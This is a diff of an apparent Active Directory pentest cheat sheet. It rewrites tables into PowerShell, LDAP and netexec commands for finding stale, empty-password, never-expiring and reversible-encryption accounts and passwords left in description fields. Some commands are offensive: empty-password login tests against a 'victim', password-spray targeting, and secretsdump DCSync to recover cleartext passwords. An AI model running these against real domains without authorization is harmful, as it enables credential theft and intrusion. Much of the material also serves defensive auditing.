@@ -20,287 +20,145 @@ linked:
 
 ***
 
-## Stale Accounts (Inactive Users)
+## Stale Accounts
 
-| **Indicator** | **Filter** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `LastLogonDate < 90 days` | Inactive 3 months | Audit candidate. |
-| `LastLogonDate < 180 days` | Inactive 6 months | Spray candidate. |
-| `LastLogonDate < 1 year` | Likely abandoned | High-risk candidate. |
-| Never logged in (LastLogonDate null) | Created but unused | Pre-positioning candidate. |
-| `Enabled=true` + stale | Active but unused | Risk. |
-| Disabled but in priv group | Re-enable risk | Audit. |
-| Stale + sIDHistory | Migration leftover | Audit. |
-| Stale service account | Forgotten — often weak pwd | High-value. |
-| Stale + AdminCount=1 | Tier 0 abandoned | Critical. |
-| `pwdLastSet > 5 years` | Stale password | Spray candidate. |
-| `pwdLastSet > 1 year` + admin | Privileged stale pwd | High-risk. |
-| `BadPasswordCount` history | Spray attempts | Detection. |
-| `LastBadPasswordAttempt` recent | Active brute | Detection. |
-| `accountExpires` past + still enabled | Bug | Edge. |
-| Disabled then re-enabled pattern | Possible attacker | Defender. |
-| New account in priv group + recent creation | Possible attacker plant | Defender. |
+| `Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly` | Users inactivos 90d | Cleanup target. |
+| `Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180) -and Enabled -eq $true}` | Active accounts inactivos 180d | Spray candidates. |
+| `Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180) -and AdminCount -eq 1}` | Priv users stale (CRITICAL) | Audit critical. |
+| `Get-ADUser -Filter {-not LastLogonDate -and Enabled -eq $true}` | Never-logged-in habilitados | Pre-position / honey-token. |
+| `Get-ADUser -Filter {PasswordLastSet -lt (Get-Date).AddYears(-1)}` | Password >1 año | Spray prep. |
+| `Get-ADUser -Filter {PasswordLastSet -lt (Get-Date).AddYears(-1) -and AdminCount -eq 1}` | Priv + pwd stale | Critical spray. |
+| `Search-ADAccount -PasswordExpired` | Cuentas con pwd expirada | Cleanup. |
+| `Search-ADAccount -LockedOut` | Lockeados ahora | Triage. |
 ^ad-misc-stale
 
-### Stale audit queries
-
 ```powershell
-# Stale > 180 days
-$stale = (Get-Date).AddDays(-180)
-Get-ADUser -Filter {LastLogonDate -lt $stale -and Enabled -eq $true} `
-  -Properties LastLogonDate,PasswordLastSet,AdminCount |
+# Pipeline audit completo stale
+$Stale = (Get-Date).AddDays(-180)
+Get-ADUser -Filter {LastLogonDate -lt $Stale -and Enabled -eq $true} `
+  -Properties LastLogonDate,PasswordLastSet,AdminCount,Description,MemberOf |
+  Select Name,SamAccountName,AdminCount,LastLogonDate,PasswordLastSet,Description |
   Sort LastLogonDate
-
-# Privileged + stale (CRITICAL)
-Get-ADUser -Filter {LastLogonDate -lt $stale -and AdminCount -eq 1} `
-  -Properties LastLogonDate,Description
-
-# Never-logged-in
-Get-ADUser -Filter {LastLogonDate -notlike "*"} `
-  -Properties LastLogonDate,Description |
-  Where {-not $_.LastLogonDate}
-
-# Stale password (>1 year)
-$pwdStale = (Get-Date).AddDays(-365)
-Get-ADUser -Filter {PasswordLastSet -lt $pwdStale} `
-  -Properties PasswordLastSet,LastLogonDate
-```
-
-```bash
-# LDAP raw (stale via lastLogonTimestamp)
-# Note: lastLogonTimestamp uses Windows FILETIME format
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(lastLogonTimestamp<=132630720000000000))" \
-  samAccountName lastLogonTimestamp
-# Adjust FILETIME for desired date
 ```
 
 ___
 
 ## PASSWD_NOTREQD (No Password Required)
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| UAC flag 0x20 (32) | PASSWD_NOTREQD | Bitfield. |
-| Account allows empty password | Direct login as user | Trivial vuln. |
-| Common in legacy migrations | Leftover from 2003-style | Audit. |
-| Service account misconfig | Atypical | Investigate. |
-| `nxc ldap DC --password-not-required` | netexec wrapper | Quick. |
-| Auth attempt with empty pwd | Test directly | Validation. |
-| `runas /user:dom\victim cmd` (empty pwd) | Native test | Direct. |
-| Password reset to empty | Possible if PASSWD_NOTREQD | Edge. |
-| Detection: PASSWD_NOTREQD audit | Periodic | Defender. |
-| Hardening: remove flag | GPO or per-user | Defense. |
-| Cross-correlate with priv group | High-value if both | Critical. |
-| LAPS-managed accounts (some) | False positive | Edge. |
-| Built-in Guest account | Often has flag set | Standard. |
-| Trust accounts | Sometimes have flag | Standard. |
-| Computer accounts | Often have flag | Standard. |
-| Filter user accounts only | Better signal | Refine. |
+| `Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true}` | Users con flag (login con pwd vacío posible) | Trivial vuln. |
+| `nxc ldap <DC> -u u -p p --password-not-required` | Lista vía netexec | Quick. |
+| `ldapsearch ... "(&(objectCategory=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=32))" samAccountName` | LDAP filter raw | Linux. |
+| `nxc smb <target> -u <victim> -p ''` | Test login con pwd vacío | Validation. |
 ^ad-misc-passwdnotreqd
 
-### PASSWD_NOTREQD discovery
-
-```bash
-# LDAP filter (PASSWD_NOTREQD = 32)
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=32))" \
-  samAccountName description userAccountControl
-
-# netexec
-nxc ldap DC -u user -p pass --password-not-required
-```
+**UAC bit:** `0x20` (decimal 32) = `PASSWD_NOTREQD`. Account permite empty password — login directo sin creds.
 
 ```powershell
-# RSAT
+# Audit users only (excluye computers/trusts)
 Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} `
-  -Properties PasswordNotRequired,Description,LastLogonDate
-
-# Test direct login (verify vulnerability)
-$cred = New-Object System.Management.Automation.PSCredential ('dom\victim', (New-Object System.Security.SecureString))
-Get-ADDomainController -Credential $cred
+  -Properties PasswordNotRequired,Description,LastLogonDate,AdminCount |
+  Where { $_.objectClass -eq 'user' }
 ```
 
 ___
 
-## DONT_EXPIRE_PASSWORD (Password Never Expires)
+## DONT_EXPIRE_PASSWORD
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| UAC flag 0x10000 (65536) | DONT_EXPIRE_PASSWORD | Bitfield. |
-| Common: service accounts | Standard | Audit. |
-| Common: privileged users | Risky | Investigate. |
-| Stale pwd + never expires | Vuln combination | Spray candidate. |
-| `Get-ADUser -Filter {PasswordNeverExpires -eq $true}` | RSAT | Standard. |
-| GPO control | Force expiration via GPO | Hardening. |
-| Per-user manual setting | Common operator action | Standard. |
-| Cross-correlate with adminCount | Privileged + stale | Critical. |
-| Cross-correlate with SPN | Service account + never expires | Common. |
-| Detection: change events | Defender | Adjacent. |
-| Compliance issue (PCI-DSS, HIPAA) | Often regulatory violation | Audit. |
-| FineGrainedPasswordPolicy override | PSO can override | Adjacent. |
-| Detection: bulk DONT_EXPIRE_PASSWORD adds | Anomaly | Defender. |
-| Per-OU GPO password policy | Granular | Standard. |
-| Privileged Users group should expire | Hardening | Defense. |
-| Old "Pa$$w0rd1" pattern + never expires | Spray hit candidate | Common. |
+| `Search-ADAccount -PasswordNeverExpires -UsersOnly` | Users con pwd que nunca expira | Audit completo. |
+| `Get-ADUser -Filter {PasswordNeverExpires -eq $true -and AdminCount -eq 1}` | Priv users con flag | Critical audit. |
+| `Get-ADUser -Filter {PasswordNeverExpires -eq $true -and ServicePrincipalName -like "*"}` | Service accounts con flag | Common combo (spray). |
+| `Get-ADUser -Filter {PasswordNeverExpires -eq $true -and PasswordLastSet -lt (Get-Date).AddYears(-2)}` | Pwd never expires + viejo (>2y) | Spray candidate. |
 ^ad-misc-dontexpire
 
-### DONT_EXPIRE_PASSWORD discovery
-
-```bash
-# LDAP filter (DONT_EXPIRE_PASSWORD = 65536)
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
-  samAccountName description pwdLastSet
-```
+**UAC bit:** `0x10000` (decimal 65536). Common en service accounts pero **debería estar en gMSA** (auto-rotation), no users normales.
 
 ```powershell
-# RSAT all PasswordNeverExpires accounts
-Get-ADUser -Filter {PasswordNeverExpires -eq $true -and Enabled -eq $true} `
-  -Properties PasswordNeverExpires,Description,PasswordLastSet,LastLogonDate |
-  Select Name,SamAccountName,PasswordLastSet,LastLogonDate,Description
-
-# Cross-correlate with admin
-Get-ADUser -Filter {PasswordNeverExpires -eq $true -and AdminCount -eq 1} `
-  -Properties PasswordLastSet,Description
+# Service accounts con never-expires + pwd viejo (spray prep)
+Get-ADUser -Filter {PasswordNeverExpires -eq $true -and ServicePrincipalName -like "*"} `
+  -Properties PasswordLastSet,LastLogonDate,Description,ServicePrincipalName |
+  Sort PasswordLastSet
 ```
 
 ___
 
 ## ENCRYPTED_TEXT_PWD_ALLOWED (Reversible Encryption)
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| UAC flag 0x80 (128) | ENCRYPTED_TEXT_PWD_ALLOWED | Bitfield. |
-| Password stored in reversibly-encrypted form | Recoverable as cleartext | Critical vuln. |
-| Why exists: legacy CHAP/Digest auth | Ancient compat | Edge. |
-| DCSync recovers cleartext | Direct via secretsdump | Critical. |
-| `secretsdump -just-dc-user user` | Privileged dump | Direct. |
-| Output includes "CLEARTEXT_PASSWORD:..." | If reversible | Standard. |
-| LDAP filter | UAC bit 128 | Direct. |
-| Modern: should be 0 | Hardening default | Standard. |
-| Detection: any user with this flag | Anomaly | Defender. |
-| Per-domain default off | Standard | Default. |
-| GPO can enforce | Hardening | Defense. |
-| Apps requiring this: rare | Legacy auth protocols | Edge. |
-| Privileged user with reversible | Critical risk | Audit. |
-| FineGrainedPasswordPolicy override | PSO can set | Adjacent. |
-| Removal cleanup | Standard hygiene | Defense. |
-| Cross-correlate with adminCount | Critical risk if both | Strategy. |
+| `Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true}` | Users con flag (pwd recoverable cleartext via DCSync) | Critical vuln hunt. |
+| `ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))" samAccountName` | LDAP raw | Linux. |
+| `secretsdump.py corp/admin:pass@<DC> -just-dc-user <victim>` | DCSync — output incluye `CLEARTEXT_PASSWORD:` si flag set | Privileged recovery. |
 ^ad-misc-reversible
 
-### Reversible encryption discovery
+**UAC bit:** `0x80` (decimal 128). Storage password en formato reversible (legacy CHAP/Digest). DCSync devuelve **cleartext password** directamente. Modern hardening = 0 users con esto.
 
 ```bash
-# LDAP filter (ENCRYPTED_TEXT_PWD_ALLOWED = 128)
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=128))" \
-  samAccountName description
+# Pipeline: detect + recover
+nxc ldap <DC> -u u -p p --query \
+  "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))" \
+  "samAccountName"
 
-# DCSync to recover cleartext (privileged required)
-impacket-secretsdump dom.local/admin:pass@DC -just-dc-user victim
-
+# Recover cleartext (priv DCSync)
+secretsdump.py 'corp.local/admin:pass'@<DC> -just-dc-user victim
 # Output:
-# victim:CLEARTEXT_PASSWORD:hereistheactualpassword
-# (only if ENCRYPTED_TEXT_PWD_ALLOWED was set)
+# victim:CLEARTEXT_PASSWORD:RealPasswordInClear!
 ```
 
 ___
 
 ## Description / Comment Field Leakage
 
-| **Pattern** | **Detection** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `description` contains password | Common leak | Critical find. |
-| `comment` contains password | Same | Common. |
-| `info` contains password | Same | Edge. |
-| Specific keywords: pass, secret, key, cred | Filter | Standard. |
-| Default password in description | Service account onboarding | Common. |
-| "Password reset to: X" | Recovery note left | Common. |
-| Encoded/encrypted password attempts | base64, ROT13 | Look for. |
-| Free-text fields rarely audited | Defender gap | Common. |
-| Authenticated Users read description | Default | Permissive. |
-| Cross-correlate with priv group | Critical if both | Strategy. |
-| Email + password combo | Combined credential | Edge. |
-| URLs in description | API docs, internal services | OSINT. |
-| Server hostnames | Internal infra | Adjacent. |
-| Migration notes | Source domain reveal | Edge. |
-| HR notes | Personal info | Privacy. |
-| Phone numbers | OSINT | Edge. |
+| `Get-ADUser -Filter * -Pr Description \| ? Description -match "(?i)pass\|pwd\|secret\|cred\|temp"` | Description con keywords cred | Cred hunt. |
+| `Get-ADUser -Filter * -Pr Description,Comment,Info \| ? {$_.Description -match "(?i)pass" -or $_.Comment -match "(?i)pass" -or $_.Info -match "(?i)pass"}` | Free-text completo (description+comment+info) | Hunt completo. |
+| `ldapsearch ... "(&(objectCategory=user)(\|(description=*pass*)(description=*pwd*)(comment=*pass*)(info=*pass*)))" samAccountName description comment info` | LDAP filter | Linux. |
+| `nxc ldap <DC> -u u -p p --query "(&(objectCategory=user)(description=*))" "samAccountName,description"` | Bulk description dump | Quick triage. |
 ^ad-misc-description
 
-### Description audit
-
-```bash
-# All users with non-empty description
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(description=*))" \
-  samAccountName description
-
-# Specific keyword search
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(|(description=*pass*)(description=*cred*)(description=*secret*)(description=*key*)(comment=*pass*)))" \
-  samAccountName description comment
-```
-
 ```powershell
-# RSAT free-text scan
-Get-ADUser -Filter * -Properties Description,Comment,Info |
+# Hunt completo + sort por priv
+Get-ADUser -Filter * -Properties Description,Comment,Info,AdminCount |
   Where {
-    $_.Description -match "pass|secret|key|cred|pwd" -or
-    $_.Comment -match "pass|secret|key|cred" -or
-    $_.Info -match "pass|secret|key|cred"
-  } | Select Name,SamAccountName,Description,Comment,Info
+    $_.Description -match "(?i)pass|pwd|secret|key|cred|temp|admin" -or
+    $_.Comment -match "(?i)pass|pwd|secret|cred" -or
+    $_.Info -match "(?i)pass|pwd|secret|cred"
+  } |
+  Select Name,SamAccountName,AdminCount,Description,Comment,Info |
+  Sort AdminCount -Descending
 ```
 
 ___
 
 ## Other Misconfig Patterns
 
-| **Misconfig** | **Detection** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `User cannot change password` | Lock-out scenarios | Edge. |
-| `Smart card required` for non-priv | Misconfig | Edge. |
-| Multiple SPNs on user | Possible attacker plant | Defender. |
-| Recent SPN add | Targeted Kerberoast | Suspicious. |
-| Recent KeyCredentialLink | Shadow Credentials abuse | Suspicious. |
-| sIDHistory on non-migrated user | Anomaly | Investigate. |
-| TRUSTED_FOR_DELEGATION on user | Risky | Investigate. |
-| User in Pre-Windows 2000 group | Legacy compat | Edge. |
-| User with mailbox = Exchange-attacked? | Common privilege escalation | Adjacent. |
-| Duplicate SamAccountName | Bug | Edge. |
-| Special characters in name | Edge | Edge. |
-| Account never disabled but inactive | Audit | Common. |
-| User without primary group | Edge | Edge. |
-| User with primary group != 513 | Tier indicator | Edge. |
-| Computers in user containers | Misclassification | Edge. |
-| Hidden/system users | Special handling | Edge. |
+| `Get-ADUser -Filter * -Pr ServicePrincipalName \| ? {$_.ServicePrincipalName.Count -gt 3}` | Users con muchos SPNs (sospechoso) | Anomaly hunt. |
+| `Get-ADUser -Filter * -Pr whenChanged \| ? whenChanged -gt (Get-Date).AddDays(-30)` | Cambios últimos 30d | Recent activity audit. |
+| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Users con Shadow Cred | Persistence hunt. |
+| `Get-ADUser -Filter * -Pr sIDHistory \| ? sIDHistory` | Users con SID History | Migration leftover audit. |
+| `Get-ADUser -Filter {SmartcardLogonRequired -eq $true -and AdminCount -ne 1}` | Smartcard required en non-priv (misconfig) | Audit. |
+| `Get-ADUser -Filter {AccountExpirationDate -lt (Get-Date) -and Enabled -eq $true}` | Expirados pero enabled (bug) | Audit. |
+| `Get-ADUser -Filter {LogonCount -eq 0 -and Enabled -eq $true -and whenCreated -lt (Get-Date).AddDays(-90)}` | Creados >90d sin logueo | Honey-token candidates. |
 ^ad-misc-others
 
-### Misc misconfig audit
-
 ```powershell
-# Multiple SPNs (suspicious for users)
-Get-ADUser -Filter * -Properties ServicePrincipalName |
-  Where {$_.ServicePrincipalName.Count -gt 3} |
-  Select Name,SamAccountName,@{n='SPNCount';e={$_.ServicePrincipalName.Count}},ServicePrincipalName
-
-# Recent attribute changes (auditable changes window)
-$recent = (Get-Date).AddDays(-30)
-Get-ADUser -Filter * -Properties whenChanged |
-  Where {$_.whenChanged -gt $recent} |
-  Select Name,SamAccountName,whenChanged |
-  Sort whenChanged -Descending
-
-# Users with KeyCredentialLink (Shadow Credentials marker)
-Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
-  Where {$_."msDS-KeyCredentialLink"} |
-  Select Name,SamAccountName
-
-# Users with sIDHistory
-Get-ADUser -Filter * -Properties sIDHistory |
-  Where {$_.sIDHistory} |
-  Select Name,SamAccountName,sIDHistory
+# Anomaly snapshot completo
+$Recent = (Get-Date).AddDays(-30)
+@{
+  RecentChanged = (Get-ADUser -Filter * -Properties whenChanged | Where whenChanged -gt $Recent | Measure).Count
+  WithKeyCred   = (Get-ADUser -Filter * -Properties msDS-KeyCredentialLink | Where 'msDS-KeyCredentialLink' | Measure).Count
+  WithSIDHist   = (Get-ADUser -Filter * -Properties sIDHistory | Where sIDHistory | Measure).Count
+  RevEncryption = (Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} | Measure).Count
+  PwdNotReqd    = (Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Measure).Count
+}
 ```
 
 ***
